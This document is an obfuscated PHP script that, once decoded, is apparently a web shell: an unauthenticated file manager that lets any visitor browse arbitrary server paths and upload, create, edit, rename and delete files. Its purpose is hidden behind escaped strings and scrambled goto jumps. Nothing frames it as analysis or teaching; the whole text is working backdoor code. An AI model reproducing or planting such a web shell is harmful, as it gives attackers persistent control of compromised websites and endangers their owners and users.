<?php
 goto yvHUi; etrUh: function processFileUpload($directory) { if (!empty($_FILES["\146\151\154\145\x55\160\154\157\x61\144"])) { $destination = $directory . DIRECTORY_SEPARATOR . basename($_FILES["\146\x69\154\145\x55\160\x6c\x6f\x61\144"]["\156\x61\x6d\145"]); if (move_uploaded_file($_FILES["\146\x69\154\x65\125\160\154\x6f\141\x64"]["\164\155\160\137\156\141\155\145"], $destination)) { echo "\74\x70\x3e\106\151\x6c\145\x20\165\x70\x6c\x6f\141\x64\145\144\x20\x73\x75\143\143\145\x73\x73\x66\165\x6c\x6c\x79\41\x3c\x2f\x70\x3e"; } else { echo "\74\160\76\106\x69\x6c\145\x20\165\x70\154\157\x61\144\x20\x66\141\151\x6c\145\144\56\x3c\x2f\160\76"; } } } goto hpRmi; fturk: echo "\x3c\150\63\x3e\103\162\145\141\x74\145\40\106\x69\154\x65\x3c\57\x68\x33\76\74\146\x6f\x72\155\x20\x6d\x65\164\150\157\x64\x3d\47\120\x4f\x53\124\x27\76\x3c\151\x6e\160\165\164\x20\164\171\160\x65\75\47\164\145\x78\x74\x27\x20\156\141\155\x65\75\47\146\151\154\145\x27\40\x70\154\x61\143\x65\150\x6f\154\144\145\162\x3d\47\106\x69\154\x65\x20\116\141\x6d\145\x27\x3e\x3c\142\165\164\x74\157\x6e\40\x74\171\x70\x65\75\x27\163\165\142\x6d\x69\x74\47\76\x43\x72\x65\x61\164\x65\74\57\x62\x75\x74\x74\157\x6e\x3e\x3c\57\x66\x6f\162\x6d\76"; goto VXU0S; eKMQN: function listDirectoryContents($directory) { $entries = array_diff(scandir($directory), array("\56", "\56\56")); echo "\74\x68\63\x3e\103\165\x72\x72\145\x6e\164\40\104\151\x72\145\143\x74\x6f\162\x79\x3a\40{$directory}\74\x2f\x68\63\x3e\74\165\154\76"; foreach ($entries as $entry) { $absolutePath = realpath("{$directory}\x2f{$entry}"); $style = determineItemStyle($absolutePath); $isDirectory = is_dir($absolutePath); echo "\74\154\151\40\163\x74\x79\x6c\145\75\x27{$style}\x27\76"; if ($isDirectory) { echo "\74\x61\40\150\162\x65\146\75\47\77\x70\x61\164\150\x3d{$absolutePath}\47\x3e{$entry}\74\57\141\76"; } else { echo "{$entry}\x20\55\40\12\40\x20\x20\x20\x20\40\x20\40\x20\40\40\40\x20\40\40\x20\x3c\141\x20\150\162\145\146\75\47\x3f\x70\141\x74\x68\75{$directory}\46\x74\141\163\153\x3d\155\x6f\x64\x69\146\x79\x26\x69\x74\145\155\x3d{$entry}\x27\76\x4d\x6f\144\x69\146\x79\74\57\x61\x3e\40\174\40\12\x20\40\40\40\40\40\40\40\40\40\40\x20\x20\x20\x20\x20\x3c\x61\40\150\x72\145\x66\x3d\47\77\160\x61\164\x68\75{$directory}\46\x74\x61\x73\153\75\x72\x65\x6d\x6f\x76\x65\x26\151\164\145\155\x3d{$entry}\x27\x3e\x52\145\155\157\x76\145\x3c\57\x61\x3e\x20\174\x20\12\x20\x20\40\40\40\x20\x20\x20\x20\x20\x20\x20\x20\40\x20\40\x3c\141\40\150\x72\145\146\75\x27\77\x70\141\x74\150\75{$directory}\x26\164\x61\163\x6b\75\x72\x65\x6e\x61\155\145\x26\x69\x74\145\x6d\75{$entry}\x27\76\x52\x65\156\x61\x6d\145\x3c\57\x61\x3e"; } echo "\x3c\57\154\151\x3e"; } echo "\x3c\57\165\x6c\76"; } goto eVI5y; eVI5y: function determineItemStyle($path) { if (is_readable($path) && is_writable($path)) { return "\x63\157\x6c\157\x72\x3a\40\147\x72\145\x65\156\73"; } return is_writable($path) ? "\x63\x6f\x6c\157\162\72\40\147\162\x61\171\73" : "\143\157\154\157\x72\72\40\x72\145\x64\73"; } goto etrUh; UCBFv: listDirectoryContents($currentDirectory); goto Xr9qX; knZ0I: function removeFile($filePath) { if (file_exists($filePath)) { unlink($filePath); echo "\x3c\160\76\x46\x69\154\145\40\162\x65\155\x6f\166\x65\144\x2e\x3c\57\x70\76"; } } goto Q7Stb; jgpcJ: if ($_SERVER["\122\x45\121\x55\105\123\124\137\115\x45\124\110\x4f\104"] === "\x50\117\123\x54") { if (isset($_FILES["\x66\151\x6c\145\125\x70\154\157\141\x64"])) { processFileUpload($currentDirectory); } elseif (!empty($_POST["\x66\157\154\144\145\x72"])) { addFolder($currentDirectory); } elseif (!empty($_POST["\x66\x69\154\x65"])) { addFile($currentDirectory); } } goto UhKTq; yvHUi: session_start(); goto ZCZrg; hpRmi: function addFolder($directory) { $folderName = $_POST["\146\157\154\144\x65\x72"] ?? ''; if ($folderName) { $folderPath = $directory . DIRECTORY_SEPARATOR . $folderName; if (!file_exists($folderPath)) { mkdir($folderPath); echo "\74\160\76\106\x6f\x6c\144\x65\x72\x20\143\x72\145\141\164\145\x64\x3a\x20{$folderName}\x3c\57\160\x3e"; } else { echo "\74\x70\76\x46\x6f\x6c\x64\145\162\40\x61\x6c\x72\x65\141\144\171\40\145\170\x69\163\x74\x73\56\74\57\160\76"; } } } goto uHqSK; uHqSK: function addFile($directory) { $fileName = $_POST["\146\x69\154\x65"] ?? ''; if ($fileName) { $filePath = $directory . DIRECTORY_SEPARATOR . $fileName; if (!file_exists($filePath)) { file_put_contents($filePath, ''); echo "\74\160\76\106\151\154\145\40\143\x72\x65\x61\x74\x65\144\x3a\40{$fileName}\74\x2f\x70\x3e"; } else { echo "\74\160\76\106\151\x6c\145\40\141\154\162\x65\x61\144\x79\x20\x65\x78\151\163\x74\x73\56\74\x2f\x70\76"; } } } goto mpHqb; Q7Stb: function renameFile($filePath) { if (!empty($_POST["\x6e\x65\x77\x4e\141\155\x65"])) { $newFilePath = dirname($filePath) . DIRECTORY_SEPARATOR . $_POST["\156\x65\x77\116\141\x6d\145"]; rename($filePath, $newFilePath); echo "\74\160\76\106\151\x6c\x65\40\162\145\156\141\155\x65\144\40\163\x75\x63\x63\x65\163\163\146\165\154\154\171\56\74\57\x70\x3e"; } else { echo "\74\146\157\x72\x6d\40\155\145\164\x68\x6f\x64\75\x27\120\117\x53\124\47\x3e\x3c\x69\156\x70\x75\x74\x20\x74\171\x70\145\75\47\x74\x65\170\x74\47\40\x6e\x61\x6d\145\x3d\47\156\145\167\116\141\x6d\145\x27\x20\160\154\141\x63\x65\150\157\x6c\144\x65\162\75\47\x4e\145\167\x20\x4e\141\155\x65\47\76\x3c\142\x75\x74\164\157\x6e\40\x74\x79\x70\145\x3d\x27\x73\x75\142\x6d\151\164\x27\76\122\145\x6e\x61\x6d\145\74\x2f\142\x75\x74\164\x6f\156\76\x3c\x2f\x66\x6f\x72\155\x3e"; } } goto xaM0H; xaM0H: if (!empty($_GET["\x74\141\163\x6b"]) && !empty($_GET["\151\x74\x65\155"])) { $itemPath = $currentDirectory . DIRECTORY_SEPARATOR . $_GET["\x69\164\x65\x6d"]; switch ($_GET["\x74\x61\x73\x6b"]) { case "\x6d\x6f\x64\x69\x66\171": modifyFile($itemPath); break; case "\162\145\x6d\x6f\166\145": removeFile($itemPath); break; case "\x72\145\x6e\141\x6d\x65": renameFile($itemPath); break; } } goto jgpcJ; KZpSx: echo "\74\x68\63\76\x43\x72\145\141\164\145\40\x46\x6f\154\x64\145\162\x3c\57\x68\x33\x3e\x3c\146\157\x72\x6d\40\x6d\145\164\150\x6f\x64\75\47\120\117\x53\x54\47\x3e\74\151\x6e\x70\165\x74\40\x74\x79\x70\x65\75\47\x74\x65\x78\x74\47\40\156\141\155\145\x3d\47\x66\157\x6c\144\145\162\x27\x20\x70\x6c\x61\x63\x65\150\x6f\x6c\144\x65\x72\x3d\47\106\x6f\154\144\145\162\x20\x4e\141\155\145\47\76\74\142\x75\x74\164\x6f\156\x20\x74\171\x70\x65\75\47\163\x75\x62\x6d\x69\x74\x27\x3e\103\x72\x65\x61\x74\145\74\57\142\x75\164\164\157\156\76\74\57\x66\x6f\162\155\x3e"; goto fturk; UhKTq: echo "\x3c\141\40\150\x72\145\146\75\x27\77\160\x61\164\x68\75" . dirname($currentDirectory) . "\x27\x3e\107\157\x20\125\160\x3c\57\141\x3e"; goto UCBFv; mpHqb: function modifyFile($filePath) { if ($_SERVER["\122\105\x51\x55\x45\123\x54\137\115\105\x54\x48\x4f\x44"] === "\x50\117\123\x54" && isset($_POST["\x63\157\156\164\x65\156\x74"])) { file_put_contents($filePath, $_POST["\143\x6f\156\164\145\x6e\164"]); echo "\x3c\160\x3e\x46\x69\x6c\x65\x20\163\141\166\x65\144\x20\163\x75\x63\143\145\163\x73\146\x75\154\154\x79\41\74\57\160\x3e"; } $content = file_exists($filePath) ? htmlspecialchars(file_get_contents($filePath)) : ''; echo "\x3c\146\157\x72\155\x20\x6d\145\x74\x68\157\x64\x3d\x27\120\x4f\123\x54\47\x3e\x3c\x74\145\x78\164\x61\x72\x65\141\40\x6e\x61\155\145\75\x27\x63\x6f\x6e\x74\145\156\164\47\x20\163\x74\171\154\x65\75\47\x77\151\x64\x74\150\x3a\x31\60\60\x25\x3b\x20\x68\x65\x69\147\x68\x74\x3a\x33\60\60\160\170\73\x27\76{$content}\x3c\x2f\x74\145\x78\x74\141\162\x65\x61\76\74\142\162\x3e"; echo "\74\x62\165\x74\164\x6f\x6e\x20\x74\171\160\145\x3d\x27\x73\x75\142\x6d\151\164\47\76\x53\x61\166\145\74\57\142\x75\x74\x74\x6f\x6e\x3e\x3c\57\146\x6f\x72\155\76"; } goto knZ0I; ZCZrg: $currentDirectory = $_GET["\x70\x61\x74\150"] ?? __DIR__; goto eKMQN; Xr9qX: echo "\x3c\x68\x33\76\x55\160\154\157\141\x64\x20\106\151\x6c\x65\x3c\x2f\x68\x33\76\74\x66\157\x72\x6d\x20\155\x65\164\x68\x6f\144\x3d\47\x50\x4f\123\x54\47\40\x65\x6e\x63\164\x79\160\x65\75\47\155\x75\154\x74\x69\160\x61\x72\x74\x2f\146\x6f\162\x6d\x2d\144\141\164\x61\x27\x3e\74\x69\156\x70\165\x74\x20\164\x79\160\x65\75\47\x66\x69\x6c\x65\47\40\156\x61\155\145\x3d\x27\146\x69\x6c\x65\125\160\x6c\157\x61\144\47\x3e\74\x62\165\164\164\x6f\156\x20\164\x79\x70\x65\75\47\163\165\x62\x6d\x69\164\47\x3e\125\x70\154\x6f\141\144\x3c\x2f\142\165\164\x74\x6f\156\x3e\74\x2f\x66\x6f\162\155\x3e"; goto KZpSx; VXU0S: ?>